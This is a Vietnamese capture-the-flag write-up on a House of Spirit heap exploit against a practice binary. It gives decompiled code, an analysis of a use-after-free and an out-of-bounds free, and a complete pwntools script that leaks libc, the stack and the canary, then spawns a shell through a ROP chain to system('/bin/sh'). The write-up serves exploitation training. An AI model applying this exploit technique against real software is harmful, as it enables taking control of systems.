# example_hos

**author : @wan** 

- trước khi giải chall này ta cần học về House of Spirit Attack 
- vì kĩ thuật này khá dễ nên mình giải thích đơn giản là : House of Spirit là kĩ thuật tấn công heap bằng cách tạo ra 2 cái fake chunk được setup đầy đủ pre size, sau đó ta sẽ free thằng first chunk, lúc này thằng fake chunk đó đang nhằm trong list bins, ta có thể malloc 1 chunk với size hợp lý để điểu khiển cái fake chunk ta vừa tạo 

### Reference 
- Nightmare: https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html#house-of-spirit-explanation
- writeup: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

## Ida

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int size; // [rsp+0h] [rbp-120h] BYREF
  int size_4; // [rsp+4h] [rbp-11Ch] BYREF
  int v7; // [rsp+8h] [rbp-118h] BYREF
  int v8; // [rsp+Ch] [rbp-114h]
  __int64 *v9; // [rsp+10h] [rbp-110h]
  void *buf; // [rsp+18h] [rbp-108h]
  __int64 s[17]; // [rsp+20h] [rbp-100h] BYREF
  __int64 v12; // [rsp+A8h] [rbp-78h] BYREF
  unsigned __int64 v13; // [rsp+118h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v9 = s;
  buf = &v12;
  memset(s, 0, 0xF0uLL);
  while ( 1 )
  {
LABEL_2:
    puts("====================================");
    puts("*** CONG TY TNHH HOUSE OF SPIRIT ***");
    puts("====================================");
    puts("1. Create");
    puts("2. Remove");
    puts("3. Write for fun");
    puts("4. Gift");
    printf("> ");
    __isoc99_scanf("%d", &size_4);
    switch ( size_4 )
    {
      case 1:
        puts("Size: ");
        __isoc99_scanf("%ud", &size);
        v8 = 0;
        break;
      case 2:
        puts("idx: ");
        __isoc99_scanf("%ud", &v7);
        free((void *)s[v7]);
        s[v7] = 0LL;
        continue;
      case 3:
        puts("write for fun");
        read(0, buf, 0x60uLL);
        continue;
      case 4:
        if ( s[6] )
        {
          puts("Gift: ");
          printf("%ld\n", v9);
        }
        continue;
      case 5:
        return v13 - __readfsqword(0x28u);
      default:
        continue;
    }
    while ( v8 <= 7 )
    {
      if ( !s[v8] )
      {
        s[v8] = (__int64)malloc(size);
        puts("Content: ");
        read(0, (void *)s[v8], size);
        puts("Content: ");
        printf("%s\n", (const char *)s[v8]);
        goto LABEL_2;
      }
      ++v8;
    }
  }
}
```

## Analysis

- chall cho ta 4 option, 1 là malloc 1 chunk, 2 là free, 3 nhập vào biến buf, 4 là Gift mà author cho là địa chỉ stack
- lợi dụng uaf của unsorted bins, ta leak được libc
- bài này thì khả năng cao ta không thể dbf được vì free((void *)s[v7]), sau khi free xong nó sẽ xóa địa chỉ của chunk ta vừa free trong s[], lúc s[] rỗng thì ta ko thể dbf được
- option 3 cho phép nhập vào buf nhằm trên stack, mà ta cũng leak được stack nhờ option 4 , hmmm lúc này ta nhảy số liền là ta có khả năng free được stack vì ta có thể setup pre size => House of Spirit
- sau khi free được stack ta muốn thì ta hoàn toàn leak được canary và overwrite rip thành system => getshell

## Exploit

- trước tiên ta leak libc trước 
```python
add(0x500, b'a' * 8)
add(0x500, b'b' * 8)
delete(0)
add(0x500, b'a')
# 0x219c61
p.recvuntil('\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219c61
print(hex(libc.address))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/bdfb6c6d-0664-4699-90ee-dbb709402908)


- sau đó ta leak stack bằng option 4

```python 
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
show()
p.recvuntil('Gift: \n')
stack_leak = int(p.recvline()[:-1], 10)
stack = stack_leak + 0xe0
print(hex(stack))
```
![image](https://github.com/gookoosss/CTF/assets/128712571/9ff47909-08f6-40ea-874b-4ef6029c7549)


- đến bước này mới khó nên ta phân tích 1 xíu
- thứ ta cần lúc này là free stack, mà hàm free() lại free thằng s[idx], lúc nào ta lợi dụng lỗi OOB để free stack gần rip
- để tránh lỗi invalid pointer khi free thì ta cần free stack có đuôi 0x0 

![image](https://github.com/gookoosss/CTF/assets/128712571/985b7053-aad9-49fe-b3a3-32ad7758a5eb)


- ta sẽ chọn địa chi 0x7fff799e0550 vì nó gần rip nhất, có đuôi 0x0 và ta có thể setup pre size cho nó

![image](https://github.com/gookoosss/CTF/assets/128712571/495c3c07-c474-4981-9b4f-62ee2d524f09)


```python 
payload = p64(0) + p64(0) + p64(0) + p64(stack) + p64(0)+ p64(0) + p64(0) + p64(0)+ p64(0) + p64(0)  + p64(0x61)
edit(payload)
delete(20)
```

- deee ta đã free thành công

![image](https://github.com/gookoosss/CTF/assets/128712571/1a79358f-24b5-4323-b619-48d05c38faa2)


- bây giờ ta leak canary thôi 

```python 
add(0x50, b'a'*25)
p.recvuntil(b'a'*24)
canary = u64(p.recv(8)) - 0x61
print(hex(canary))
```

- có được canary rồi thì ta free lại stack 1 lần nữa và get shell thôi

```python 
payload = p64(0) + p64(0) + p64(0) + p64(stack) + p64(0)+ p64(0) + p64(0) + p64(0)+ p64(0) + p64(0)  + p64(0x71)
edit(payload)
delete(4) # vì idx đã lớn hơn 7 nên ta cần free 1 thằng cũ để có malloc tiếp
delete(20)
ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
payload = p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) 
payload += p64(ret)
payload += p64(libc.sym['system'])
add(0x60, b'a'*24 + p64(canary) + p64(0) + payload)
p.sendlineafter(b'> ', b'5')
```

![image](https://github.com/gookoosss/CTF/assets/128712571/e51caa7f-a105-4ffa-970e-27f34008322f)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./example_hos_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process([exe.path])
        
gdb.attach(p, gdbscript = '''
b*main+400
b*main+528
b*main+628
b*main+695
b*main+754
b*main+795
c           
''')

input()   

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: \n', str(size))
    p.sendafter(b'Content: \n', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: \n', str(idx))

def edit(data):
    p.sendlineafter(b'> ', b'3')
    p.send(data)

def show():
    p.sendlineafter(b'> ', b'4')

add(0x500, b'a' * 8)
add(0x500, b'b' * 8)
delete(0)
add(0x500, b'a')
# 0x219c61
p.recvuntil('\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219c61
print(hex(libc.address))
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
add(0x60, b'a' * 8)
show()
p.recvuntil('Gift: \n')
stack_leak = int(p.recvline()[:-1], 10)
stack = stack_leak + 0xe0
print(hex(stack))
payload = p64(0) + p64(0) + p64(0) + p64(stack) + p64(0)+ p64(0) + p64(0) + p64(0)+ p64(0) + p64(0)  + p64(0x61)
edit(payload)
delete(20)
add(0x50, b'a'*25)
p.recvuntil(b'a'*24)
canary = u64(p.recv(8)) - 0x61
print(hex(canary))
payload = p64(0) + p64(0) + p64(0) + p64(stack) + p64(0)+ p64(0) + p64(0) + p64(0)+ p64(0) + p64(0)  + p64(0x71)
edit(payload)
delete(4) # vì idx đã lớn hơn 7 nên ta cần free 1 thằng cũ để có malloc tiếp
delete(20)
ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
payload = p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) 
payload += p64(ret)
payload += p64(libc.sym['system'])
add(0x60, b'a'*24 + p64(canary) + p64(0) + payload)
p.sendlineafter(b'> ', b'5')
p.interactive()

```

